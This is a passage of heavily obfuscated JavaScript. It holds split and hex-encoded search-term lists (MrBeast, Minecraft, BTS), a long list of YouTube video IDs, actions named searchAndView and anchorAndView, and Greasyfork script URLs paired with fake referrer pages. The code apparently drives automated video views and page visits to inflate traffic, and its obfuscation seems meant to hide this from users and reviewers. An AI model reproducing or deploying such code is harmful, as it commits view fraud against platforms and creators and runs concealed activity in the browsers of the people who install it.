't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + W(0xb) + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + W(0xc) + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x21a5 + 0xd1 * 0x1f + 0x860)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xa15 + 0x1b09 * 0x1 + -0x2514)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + W(0x9) + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x3 * -0x798 + -0x1267 + -0x1 * -0x2932);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    X(0x15, 'twJ[') + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    Y(0xf) + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + W(0x1),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + X(0x3, 'Hjgm'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + Y(0x6) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + W(0xa) + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': Y(0xd) + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
